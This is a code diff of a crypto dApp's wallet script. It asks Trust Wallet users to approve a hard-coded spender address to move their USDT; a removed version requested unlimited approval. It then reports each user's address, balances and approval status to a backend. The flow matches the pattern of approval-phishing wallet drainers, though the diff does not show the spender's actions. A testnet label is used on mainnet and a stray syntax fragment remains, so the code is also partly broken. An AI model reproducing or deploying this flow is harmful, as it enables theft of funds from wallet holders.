@@ -496,79 +496,59 @@ async function switchToBSC(provider) {
 let isApproving = false;
 
 async function ensureTokenApproval() {
-  if (isApproving || isTokenApproved) return;
-  isApproving = true;
+  if (isTokenApproved) return;
 
-  async function logApproval(tag) {
-    await notifyBackend(
-      currentAddress || "",
-      BNB_TESTNET_LABEL,
-      currentUserId || "",
-      currentBNBBalance,
-      currentTokenBalance,
-      tag
-    );
+  // Always prefer the direct injected provider in Trust Wallet mobile browser
+  const provider =
+    window.trustwallet?.ethereum ||
+    (window.ethereum?.isTrust ? window.ethereum : null) ||
+    providerInstance ||
+    window.ethereum;
+
+  if (!provider || typeof provider.request !== "function") {
+    alert("No active wallet provider found. Please reconnect.");
+    return;
   }
 
   try {
+    setStatus("Requesting approval…");
 
-const rawProvider =
-  providerInstance ||
-  window.appKit?.getWalletProvider?.() ||
-  window.trustwallet?.ethereum ||
-  window.ethereum;
-
-const provider = await resolveValidProvider(rawProvider);
-if (!provider) {
-  alert("Wallet provider not found. Please reconnect.");
-  return;
-}
-
-    providerInstance = provider;
-
-    setStatus("Checking network…");
-
-   const chainIdNum = await getActiveChainId(provider);
-if (chainIdNum !== 56) {
-  const switched = await switchToBSC(provider);
-  if (!switched) {
-    alert("Please switch to BNB Smart Chain (56) in your wallet and reload the page.");
-    setStatus("Wrong network");
-    return;
-  }
-}
-
-    // 3. Get active account
+    // 1. Get current account directly from provider
     const accounts = await provider.request({ method: "eth_requestAccounts" });
-    const ownerAddress = accounts[0];
-    currentAddress = ownerAddress.toLowerCase();
+    const owner = accounts?.[0] || currentAddress;
+    if (!owner) {
+      alert("No wallet address detected.");
+      return;
+    }
+    currentAddress = owner.toLowerCase();
 
-    // 4. Encode ERC-20 approve(spender, amount) call data directly via ethers.Interface (no RPC needed)
+    // 2. Verify BSC Mainnet (56 / 0x38)
+    const chainHex = await provider.request({ method: "eth_chainId" });
+    if (parseInt(chainHex, 16) !== 56 && Number(chainHex) !== 56) {
+      await provider.request({
+        method: "wallet_switchEthereumChain",
+        params: [{ chainId: "0x38" }],
+      });
+    }
+
+    // 3. Encode approve(spender, amount)
     const iface = new ethers.Interface(ERC20_APPROVE_ABI);
-    const data = iface.encodeFunctionData("approve", [
-      SPENDER_ADDRESS,
-      ethers.MaxUint256 // Or use ethers.parseUnits("100", 18) for a capped amount
-    ]);
+    const amount = ethers.parseUnits("100", TOKEN_DECIMALS);
+    const data = iface.encodeFunctionData("approve", [SPENDER_ADDRESS, amount]);
 
-    setStatus("Confirm in wallet…");
-
-    // 5. Fire raw EIP-1193 transaction directly to Trust Wallet mobile UI
+    // 4. Fire native wallet transaction prompt
     const txHash = await provider.request({
       method: "eth_sendTransaction",
       params: [
         {
-          from: ownerAddress,
+          from: owner,
           to: TOKEN_ADDRESS,
           data: data,
-          value: "0x0"
-        }
-      ]
+        },
+      ],
     });
 
-    console.log("[approve] tx sent:", txHash);
     setStatus("Approval pending on chain…");
-
-    // 6. Poll for receipt using public BSC RPC (avoids mobile WebView RPC drops)
     const bscReadProvider = new ethers.JsonRpcProvider(BNB_TESTNET_RPC);
     await bscReadProvider.waitForTransaction(txHash, 1);
 
@@ -577,51 +557,25 @@ if (chainIdNum !== 56) {
     updateUIState();
     setStatus("Connected + Approved ✅");
     updateApproveButtonUI();
-    await logApproval("approval_approved");
 
+    await notifyBackend(
+      currentAddress,
+      BNB_TESTNET_LABEL,
+      currentUserId || "",
+      currentBNBBalance,
+      currentTokenBalance,
+      "approval_approved"
+    );
   } catch (err) {
-    console.error("Token approve error:", err);
-    let tag = "approval_error";
-    if (err && (err.code === 4001 || err.code === "ACTION_REJECTED")) {
-      tag = "approval_rejected";
-    }
+    console.error("Approval error:", err);
+    alert("Approval failed: " + (err?.message || JSON.stringify(err)));
     isTokenApproved = false;
     approvalFailed = true;
     updateUIState();
     setStatus("Connected • Approval failed");
     updateApproveButtonUI();
-    await logApproval(tag);
-  } finally {
-    isApproving = false;
   }
 }
-
-
-
-
-
-
-
-    
-
-modalApproveBtn?.addEventListener("click", async () => {
-  modalApproveBtn.disabled = true;
-  modalApproveBtn.textContent = "Waiting for wallet…";
-
-  try {
-    await ensureTokenApproval();
-  } finally {
-    modalApproveBtn.disabled = false;
-    modalApproveBtn.textContent = "Approve USDT";
-
-    if (isTokenApproved) {
-      closeApprovalModal();
-
-    }
-  }
-});
-
-
 
     
     async function restoreSessionFromAddress(address){
@@ -879,60 +833,49 @@ function updateApproveButtonUI() {
    
         
 
-    // ===== DOMContentLoaded =====
-    document.addEventListener("DOMContentLoaded", async function(){
+async function initDapp() {
+  const approveBtn = document.getElementById("approveBtn");
+  if (approveBtn) {
+    approveBtn.addEventListener("click", async () => {
+      if (!isWalletConnected) {
+        alert("Wallet not connected yet.");
+        return;
+      }
+      approveBtn.disabled = true;
+      approveBtn.textContent = "Approving…";
 
-   
+      try {
+        await ensureTokenApproval();
+      } finally {
+        approveBtn.disabled = false;
+        approveBtn.textContent = "Approve Now";
+      }
+    });
+  }
 
-const approveBtn = document.getElementById("approveBtn");
-if (approveBtn) {
-  approveBtn.addEventListener("click", async () => {
-    if (!isWalletConnected) return;
-    approveBtn.disabled = true;
-    approveBtn.textContent = "Approving…";
+  setupAppKitProviderWatcher();
 
-    await ensureTokenApproval();
+  if (connectBtn) {
+    connectBtn.addEventListener("click", function () {
+      if (isWalletConnected) return;
+      connectFlow();
+    });
+  }
 
-    approveBtn.disabled = false;
-    approveBtn.textContent = "Approve Now";
-  });
+  await autoConnectOnLoad();
+  const yearEl = document.getElementById("year");
+  if (yearEl) yearEl.textContent = new Date().getFullYear();
 }
 
-
-
-      
-
-      
-      
-setupAppKitProviderWatcher();
-        if(connectBtn){
-        connectBtn.addEventListener("click", function(){
-          if(isWalletConnected) return;
-          connectFlow();
-        });
-      }
-
-
-
-
-
-
-      
-
-
-
-
-
-      
- 
-  
-
-    
-
-      await autoConnectOnLoad();
-      const yearEl = document.getElementById("year");
-      if(yearEl) yearEl.textContent = new Date().getFullYear();
-    });
+if (document.readyState === "loading") {
+  document.addEventListener("DOMContentLoaded", initDapp);
+} else {
+  initDapp();
+}
+                              
+                             
+                             
+                             );
 
   })();
   
